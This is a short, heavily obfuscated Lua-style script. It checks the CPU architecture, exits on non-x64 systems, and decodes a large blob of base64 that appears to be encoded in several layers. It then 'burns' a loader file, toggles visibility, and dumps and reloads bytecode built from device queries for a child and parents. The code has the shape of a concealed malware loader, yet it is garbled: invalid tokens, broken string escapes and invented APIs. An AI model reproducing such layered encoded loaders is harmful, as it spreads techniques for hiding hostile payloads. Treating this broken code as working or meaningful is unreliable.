local a=require('system')local b=require('misc')local d=a.getDevice()if a.getArm()~="x64"then os.exit()end;function Base64dec(e)return b.base64_decode(e)end;local f=Base64dec([[
Vm0wd2QyVkhVWGhVYmxKV1YwZFNUMVp0TVZOWFZsbDNXa1JTVjAxWGVIbFhhMXBQWVZVeFYxTnNXbGRTTTFKUVZtcEJlRmRIVmtWUmJVWlRWbXhzTTFkV1pEUlRNazE0Vkc1T2FWSnVRazlWYlRWRFZWWmtWMVZyZEZSTlZYQjVWRlphVjFaWFNraGhSemxWVm14d2VsUlVSbUZqYkZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVRtcFRSVXBZV1ZSR2QxbFdjRmhsUjNSWFRWZDBObGxWV210VWJGbDRVMnh3VjFaNlJYZFdha1poVTBaT2NtRkhhRlJTVlhCWlYxWmtlazFYVW5OVmJrNVlZbGhTV0ZadGRHRmxWbGw0VWxF
Vm0wd2VFNUdWWGhUV0doWVYwZG9WMVl3Wkc5V1JteDBZM3BHYWxKc1NsWlZNbmhQWVd4S2MxZHVjRmROYmxGM1ZtMXplRmRIVmtWUmJVWlRWbXhzTTFkV1ZtRlRNbEpJVm10a2FGSnRVbkJXTUZwSFRURmtWMVZyWkZSTmJFcFlWVzAxUzJGR1NuUmhSbXhXVFVaYVRGVXhXbXRXTVZwMFpFWlNUbFp0ZHpCV2EyTXhVekpHVjFOdVZsSmlWR3hXVm01d1IyUnNiSEZTYlhSWFRWZFNNRnBGV2s5VWJGbDRVMnR3VjFaNlJYZFpla1pYWkVaT2MxZHNhR2xTTW1ob1YxZDBhMVV5VW5OV2JrNVlZbGhTV0ZSV1duZE5SbkJHVjJ4a2FGWnNjSHBaTUZKaFZqSktTRlZVUWxwbGExcFlXa1ZhUzFkWFRrZFRiV3hUWVROQ1dWWXhXbE5TTVd4WFUxaG9WbUpIVWxsWmExcDNZekZXZEdWSVpFNVNia0pIVmpJMWExWXdNVVZTYTJoYVRVWmFNMVpxUm1GU2JVbDZXa1p3YkdFeGNHOVdha0poVkRKTmVWTnJhR2hTYXpWWlZXMTBkMWRXV25KWGJHUmFWakZHTkZaWGRHdGhiRXBZWVVoT1ZtRnJOVlJaTVZwVFZqRndSVlJyTldsU2JIQlpWbGQ0Umc
Vm0wd2VFNUdWWGhUV0doWVYwZG9WMVl3Wkc5V1JteDBZM3BHYWxKc1NsWlZNbmhQWVd4S2MxZHVjRmROYmxGM1ZtMXplRll5VGtsaFJscE9ZbTFvVVZadGRGWmxSbGw0V2toT1dHSkdjRmhVVkVaTFpWWmtWMWR0ZEZSTlZUVkpWbGQwVjFZeVNrZFhiR2hhWVRKb1JGcFdXbXRXTVZaeVUyMTRVMkpXU2xsV1Z6QXhWREpHVjFOdVRtcFRSVXBZVkZWYVlWUkdWbk5YYlVaWFZtczFlRlpYZUZkVWJGcFlaSHBDVjAxdVVuWlZha1pXWlZaT2MxZHNhR2xTYTNCWlYxWmtNRmxXVWtkVmJsSnNVak5TV1ZacVFURlNNVnBJVFZoa1ZXSkdjRlpXYlhSM1ZqSktWVkpZWkZwbGExcHlWVEJhVDJOdFNrZFRiV3hUVFcxb1dGWnRNSGhPUm14V1RVaG9hbEp0YUhOVmJUVkRZekZhY1ZKcmRGTk5Wa1kwVjJ0b1QyRkdXbk5qUmxwWFlsaFNVdw
Vm0wd2QyVkhVWGhVV0dSUFZsZG9WRmx0ZEhkVU1WcDBUVmM1VjFKdGVGbFplazVx
Vm0wd2QyVkhVWGhVV0dSUFZsZG9WRmx0ZEhkVU1WcDBUVmM1VjFKdGVGbFplazVx
Vm0wd2QyVkZNVWRYV0docFVtMVNWMWx0ZUV0WFJteFZVMnhPV0ZadGVIbFhhMk0xVmpGS2RHVkdXbFpOYWtFeFdWZDRTMk14V25GVWJIQlhWbXh3VVZadGRGWmxSbGw0V2toV2FGSnNjSEJXYTFwaFpWWmtWMVZyU214U2JWSkpWbTEwYzJGV1NuUmhSemxWVm0xb1JGbHFSbHBsUm1SelYyMTRVMDFFUlRCV1ZFa3hVakZaZVZOclpHcFRSVXBZV1ZSR2QxbFdjRmhsUjBaWFZtczFlRlpYZUZOVWJFcEhWMWhrVjFaRmIzZFpla1pYWkVaT2NtRkhhRlJTVlhCWlYxWlNSMlF5UmtkWFdHaFlZbGhTY1ZSV2FFTlNiRnBZVFZoa2FGWnNjSHBaTUZwelZqRmFSbUV6YUZaaGExcFlXa1ZhVDJNeFpITmhSMnhUVFcxb1dGWnRNSGhPUm14WVVtdGthbEpYVWxsWmEyaERZekZXZEUxVVRrNWlSbG93VkZab2EyRkdXbkppZWtwYVYwaENTRlpxU2t0VFJsWlpXa1p3YUdFelFrbFdWM0JIVkRGa1dGUnJhR2hTYXpWWlZXMTBkMWRXV1hoWGJYUk9VbTE0V0ZaR2FHOWhiRXAwVld4c1dtRXhWWGhaTVZwaFpFZFdSbVJIZUZkaVJYQTFWbGQ0Umc
Vm0wd2QyVkhVWGhVYmxKV1YwZFNUMVp0TVZOWFZsbDNXa1JTVjAxWGVIbFhhMXBQWVZVeFYxTnNXbGRTTTFKUVZtcEJlRmRIVmtWUmJVWlRWbXhzTTFkV1pEUlRNazE0Vkc1T2FWSnVRazlWYlRWRFZWWmtWMVZyZEZSTlZUVkpWbGQwVjFZeVNrZFhiR2hhWVRKb1JGcFdXbUZqYkhCRlZXeFNhVlpzY0VsV2EyTXhWREpHYzFOdVRtcFNWR3hoVm1wT2IyRkdXWGhYYlVacVlrWndNRlZ0ZUZOaFZscHpZMFZ3VjFaRlduWmFSRXBIVWpGT2RWWnNTbWxoTUhCWlYxWlNSMWxYUmtkWGJHUllZbFZhVkZSV1duZE5SbkJHVjJzNVZXSkdiRFJWTW5SdlZqRktSbGR0YUZwbGExcGhXbFphUzFkWFRraGhSazVvWld4YVdGWnRNREZrTVZsNFZtdGtWbUpHV2xSWmEyUlRWVVpzY2xadFJteGlSbXcxVkZaU1UxWnJNWEpqUldoWFRWWktSRlpxUm1GU2JVbDZXa1prVjFKWVFrbFhXSEJIVkRKT1YxcElVbWxTYkVwVVZteG9RMkl4V1hoYVJFSmFWbXN4TkZVeWRHdGhiRXBZWVVoT1ZtSkdTbGhaZWtaaFkxWktkRkpzVW1sU2JrSktWMnhXWVZReFduSk5XRXBYWVd4d1YxWnFUbTlsYkZweFUydGFiRlpzV25oV01uaFhWakpLU1ZGc1FsaGlSbHBvVmtSS1UxWXhWblZVYldoVFRXMW9VRlpHVmxka01WbDRWMWhvV0dKRk5WTlpXSEJIVjFaYWRHVkhkR2hXYXpWSFZqSjRVMWRzWkVsUmJuQlhZVEZ3VkZacVJtdGtWbkJJWlVkc1UySnJTa3RXTW5oWFdWZEZlRmRZYkZOaGJIQlRXVmR6TVZZeFVsaE9Wa3ByVFZad01GbDZUbTloTVZwelYyNXdXbFpXY0hKWlZXUkdaVWRPUjFac2FGaFRSVXBKVjJ0U1IxTXlUWGhqUld4V1lsZDRWRlJVU205a01WcDBZMFYwYVUxV2NFaFdNV2h2VjBkS1JrNVdUbHBYU0VKSVZqQmFXbVZIUmtoUFZtUk9WakZLU2xac1pEUmlNV1IwVTJ0a1ZHSnVRbGhVVlZwM1pXeHJlV1ZIZEdwaVZrcElXVlZhVDJGV1duSmlla0pYWWxoU2NsUlZaRVpsUm1SWllVWlNhV0V6UWxsWFZtUTBXVlpzVjFkdVRsaGlWVnBaVlcxNGQyVldXbk5oUnpsb1RWWndlbFl5Tlc5V01VbDZZVWhLVjFaRlJqTmFWVnBMWTFaU2MyRkdhRlJTVlhCT1ZteGtkMUl4VFhsVmEyUlZZbXR3YUZWdGVHRmpSbFp6WVVWT1ZsSnNjREJhVldNMVZXc3hWMU5yYUZkTmFsWlVWa2Q0WVZJeFRuTmhSbFpYVFRKb1NWWkhkR0ZYYlZaV1RsWmFVRlp0VWs5V2FrWkxVMnhhYzFremFHbE5WbkJZVmpKd1lWWXlTa2RUYkdoV1lsaG9NMXBYZUdGak1XUnlUMWQwVTFaSGVGbFdNblJXVFZaWmVGZHJXbGRoYkhCWVdXeG9VMk5XVWxkYVJWcHNVbTFTZVZkcldtOWhWa2w2WVVaU1dGWnNTa3haYWtaYVpVWldjMkZGT1ZkaGVsWmFWbGN4TkdReFNYaFhXR3hyVWtWS1dWVnRkSE5OTVZsNVpFYzVXR0Y2UmtoWk1HUnZWakZKZW1GRmVHRlNiSEJJV1RGYVMyTXlSa2RhUlRWT1VsaENTMVp0Y0VkWlZteFhZa1pvVm1FeVVsZFpiWFIzVjFac2NscEhPV3BTYkZwNFZUSXdOVll4U25OalJXaFlWa1UxZGxadGMzaFNWbHB5WVVaa1RtRnNXazFXYWtKclV6Rk9SMVp1VmxKaVJscFlXV3RhZG1Wc1duRlJiVVpvVFdzMWVsZHJhRk5WTWtwSVlVYzVZVll6VWt0YVYzaGhZMVpPY1ZWdGFFNVdNVW8yVm1wSk1WUXlSbk5VYTJ4U1lsVmFWbFp1Y0Zka2JGcFdWMjVPVDJKRmNEQlZiVEV3VlRBeFZtTkZiRmhXYkZwb1dWUktSMUpyTVVsYVJsSnBVMFZLV1ZaR1dtRmtNV1JIVjI1R1ZHRXpRbk5WYlRGVFYyeHNWbGRzVG1oV01IQkhXVEJvWVZZeFdYcGhTRnBXVmtWYWNsVnFSbUZrVmtwelZtMW9UbEpHV2paV01XUXdZakZGZUZOWWFGaGliRXBRVm14U2MxZEdWblJrU0dSc1lrZDBNMVpYZEd0V01ERkZVbTVvVm1KVVZqTldha3BIWTJ4S2NWUnRSbE5TVm5CUlYydGFhMVF4U1hoYVNFcFBWbTFTY0ZVd1ZrZE9WbHAwWlVjNWEwMVZNVFJXUm1odlZsZEZlVlZzYUZwaVdGSXpXVEJhVjJSRk1WZFViWEJUWWxob05sZFdWbXBPVjBwSFUyNVNWbUpIZUdoV2JGcDNWVVphZEdNemFHcGlWVFZLV1RCYWEyRldTWGxoUkZwWVZqTlNhRlY2UVRGa1JrNXlXa2RvVTJKclNuWldSbHBoWkcxV2MxZHVSbE5pVlZwWFZGWmFkMDFHVm5Sa1IwWldVbXh3ZWxVeU5VTldiVXBJWVVWU1ZrMUdjR2hXYkZwUFZsWktkR0ZGTlZkTlZXOHlWbTF3UzJReGJGZFhXR3hVWW1zMWNWVnFTbTlXTVd4eVdrWk9WMUpzVmpOV01uaDNZVEF4V0ZWcVFsWmlXR2gyVm1wS1JtVkhTWHBhUm1oWFVsVndiMVpzVWtkV2JWRjNUVlpzVldKR1NtOVpWRVozVjFaYVIxZHRSbXROYXpWWVdUQmFZVmxXU25KalNFNVhZbGhvYUZwWGVHdGpiSEJKV2taYVRtRXpRbHBYVmxaaFlqRmtSMWRxV2xOV1JVcFpWbTE0ZDJGR1ZuRlNiWFJyVm14S2VsZHJaSE5oUjFaelYycGFWMkpIVGpSVWEyUk9aREF4U1dGR2FGaFNNMmhSVm0xNFUyTXlTWGhYYms1V1lUSlNjMVp0TVRCTk1WcFlaRVU1VjAxRVJubFpNRnBoVmpKS1dWVnVXbGRoYTBZMFZXcEtUMUp0VmtkYVIyaG9UVmhDVWxZeFVrcGxSbFY0VTFob1lWTkZjRkJXYWtvMFlqRndXR1JGY0U1U2JIQXdXbFZrZDJKR1NsVldhMmhXVFZkb2VsWnNXbXRUUjFaSFZXeHdWMUpXYjNwWFZFWmhWakpPVjFSdVVsQldiVkpVV1d0V2QxZEdaRmRXYkdSVlRXdHdTVlV5ZEd0aGJFNUlaVVpvVjJGck5WUldWVnB6VjBkTmVtRkdaRTVoZWxaTFYxUkNZVmxXVW5SVGJsSm9Va1Z3V0Zsc2FGTmpiRlkyVTJzMWJGSnVRa3BXVjNoUFlWWktjMk5HYkZkV00yaG9Xa1JLU21WR2NFbFRiRnBvVFd4S2FGWnRNWHBOVms1WFYyeG9hMUl6VW1GV2JYUjNUVVpzVmxkdE9WaGlSbkJIVkd4V1UxWnJNVWRqU0VwWFRVZFNWRlZxUm5kU01WcHlUbFprYVZKdGREUldiWGhyVGtkSmVWSllhRlpYUjJoWldXdGtORll4YkhKYVJ6bGFWbTE0VmxWdE5XdFdNREZaVVd0YVZtSlVWbEJaVjNoaFkyeGtjVkpzYUdoTmJFbDZWbTF3UzFNeFpGZGhNM0JwVW0xU2NGVnFSa3BOYkZwSVpVZEdWMkpXV2toV1J6VlhWbGRLU0ZWdE9WcFhTRUpZVmpGYVlWZEZOVmxhUm1ST1VrVkpNRlpxU1RGVk1rWjBWbTVLV0dKSGFHRldNR2hEVjBaYWRHVkdjR3hXVkVaWFYydGtjMVV3TVVkWFZFSllWa1ZLYUZWcVJscGxSbVJaWTBaYWFXRXpRbGxXVjNCUFZEQTFSMWR1UmxOaVIxSlpWbTAxUTFOR1dYbE5XRTVYVW10d1Yxa3dXa2RXTWtwVlVsUkNWMVpGV21GYVZscGhZMnh3UjJGSGJHaGxiRnBaVmpGYVUxUXhWWGhYYms1V1lrZFNXVmx0TVZOV1ZscDBUVlpPVjJKR2NFbFViR1F3VmpBeFYySkVUbHBOUm5BelZtMTRXbVZ0UmtsVGJHUnBVakZLU0Zkc1ZtRlpWbVJZVW10a1YySlhlRmxWYWtwdlRsWmFkRTFVVWxwV2F6RTFWbGQwYjFadFJYbFZiR3hhVjBoQ1dGWnJXbHBrTVZweVpFWmFUbFp1UVhkV1JscFRWVEpHUmsxVlZsTmhNbWhZVm0weGIyUnNXbk5hUlhSVVVteGFlbFpYZUhkaFZtUkdUVlJTVjJGclNtaFpla1poVmpGU2RWSnNXbWxTTVVwVlYxZDBiMUV3TlhOWGJrWlVZV3RLVDFWdE1WTlRWbFY1WkVkMFdGSXdjRWxhVldSdlZtMUtTRlZyT1ZWV2JIQm9XVEZhVDJOdFVrZFViV2hzWWtad1dsWnFTakJaVjFGNFZXNU9WR0pyTlZoV01HUnZWMFpzY2xkcmRGUlNiVkpZVjJ0Vk1XSkdTblZSYTNCV1RXNW9hRmxXV2t0a1ZrWnpVV3hrVjJWclJqUldWbEpIWVRGWmVGcElWbE5pUlRWd1ZteGFkMkZHV25SalJVcE9WakZhZWxZeGFITlVNVnBWWWtac1ZtRnJTak5WYWtaeVpERmFWVlpzWkdsV1ZuQTFWMVJDYjFsV1duUlRhMlJxVWpKb1dGUlZaRk5YUmxaeFVtNWtWRkl3V2tkVWJGcHJZVlprU0ZScVRsZGlXRUpNVkZWYVdtVkhTa2RhUm1oWVVqTm9WbGRXVWt0Vk1rNVhWbTVTYW1WcldsaFphMXAzVFVad1ZtRkhkRlZoZWtaWVZtMXdWMWxXV2xkalNFcGFWak5PTkZacVNrOVNWa1owVW14T1YySkdXVEJXTVZwaFdWWnNXRlJZYkZWaE1YQndWVzB4VTJOR1duSldiR1JPVFZad2VWWlhkR3RXTWtwWFYydG9XR0V5YUZCV01HUkhUbTFLUjJGR2NHbFNia0pOVm1wQ1lXRXhaRWhWYTJoVFlsaFNUMWxVUm5kVFZscHhVbTA1YVUxWFVrbFZNbmhoVjBkS1NHRkhSbHBoTVhCb1dWVmFWMk5XU25OalIzaFhUVlp3U0ZkclZtRldNa1pYVTI1V1VtRnNjRmxXYTFaTFYwWndSVkpzY0d4U2JWSmFXVEJrYjFVd01YUmhSbkJYWWxSRk1GcEVTazlqTVdSMVVteE9hVmRHU25oV1JscHJWVEF4UjJKR1dsaGhlbXhZVkZkMGQyVldWWGxsUm1SWFRXdFdORmt3V205WGJGcEdWMnhrWVZaV2NISldNV1JIVWpKR1NHSkhiRk5YUlVreFZtMTRhbVF5VmtkV1dHaGhVbTFTV1ZsdGVFdGpNVlYzV2taT1dGSnNTbGhYYTFKVFZqQXhWMk5FUWxwTk0wSllWbXBLUjA1c1NuTmhSbkJPVW10d1JWWnFTalJaVmxsNFdrWldVbUpIVW05WlZFWjNWRVprYzFwRVVsZE5hekUxVlcxMGExZEhTbGhoUlRsWFRVWmFURlpYZUZwbFJsWnlZMGQ0VTJGNlJUQldWRWt4VXpGV1IxZHVVbFppUjJoaFZqQm9RMWRHV1hkWGJVWnFUV3RhUjFaSE1UQmhWa3AxVVdwYVdGWnNXblpaVkVaWFkyc3hWMXBIYkZOU2EzQlpWbGN3ZUdJeVVuTlhibEpPVmxoU2NWbFljRmRYVmxGNFYyMUdhRlpyYkRSVmJHaHJWakF4VjJOSGFGcGxhMXBvVm1wR1MyUldXblJTYkU1b1pXeGFVVlp0TUhkbFJUQjVWbTVPV0dKc1NrOVZhMVpoVm14U1YxZHVUazlXYkZZMVdrVmpOV0ZXU25KT1ZXeGhWbFp3YUZac1dtRmpNazVJWVVaV1YxSldjR2hYYTFKSFpERktkRlZyWkdGU2JWSlBWVEJXUzFSR1duRlRha0phVmpCV05GWnNhR3RVYkU1SVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlTRUphVmtaYVlWTXlTa2RYYmtwUFYwZDRXRmxzYUc5aFJteFhWMnh3YkZZd1draFdiWGhyVlRKS1IyTkVTbGRXYkVwRFdrUktWMUl4Y0VsVWJHUnBVbFJXZDFadGVHRmtNVmw0VjJ0a1dHSlZXbUZXYlhNeFUwWmtjbUZGZEdoU2EzQjVWR3hhYjFadFJuSlRiV2hoVm14d1ZGbDZSbk5PYkZweldrZHNWMWRGUmpSV2JGcHFUVmRSZUZwSVNrNVdWbkJZVmxaRg
  ]])local g=function()function Base64dec(e)return b.base64_decode(e)end end;if a.getArm()=="x32"then local h=b.burn("loader.lua")if-EONXJ==b.vis(-EONXJ,true)then b.vis(-EONXJ,false)end end;dv7={}if dv7.bytecode then bytecode={}bytecode.dump("di")bytecode.exitdump()end;gd={}if gd.isNotLoaded then fd={}repeat fd.load()until fd.load()end;bytecode.dump("\exoje\EDXec\EDXEx\KOME\\")bytecode.write({[439-3904]=true})bytecode.dump(d)c={}c.n={Baby=gd.getDevice("child"):baby(),Father=gd.getDevice("Parents"):father(),Mother=gd.getDevice("Parents"):mother()}bytecode.dump(c.n)bytecode.redump(c.n)bytecode.undump(c.n,"newCode")